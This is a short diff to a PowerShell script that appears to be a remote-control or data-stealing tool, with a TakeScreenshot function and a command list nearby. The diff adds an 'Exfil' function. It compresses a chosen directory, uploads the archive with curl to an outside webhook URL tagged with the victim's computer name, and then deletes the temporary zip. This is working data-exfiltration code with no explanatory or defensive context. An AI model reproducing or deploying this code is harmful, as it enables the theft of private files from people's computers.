@@ -193,6 +193,25 @@ function TakeScreenshot {
  
 }
 
+function Exfil {
+    param (
+        $Path
+    )
+
+    $Data = Get-Item $Path
+    $ExfilTemp = "$env:TEMP\temp.zip"
+
+    if($Data -is [System.IO.DirectoryInfo]){
+
+        Compress-Archive $Data -DestinationPath $ExfilTemp  -CompressionLevel Fastest
+        curl.exe -F "file1=@$ExfilTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null
+        Remove-Item $ExfilTemp -Force
+
+    }
+    
+}
+
+
 
 ##########################
 $commands = @()
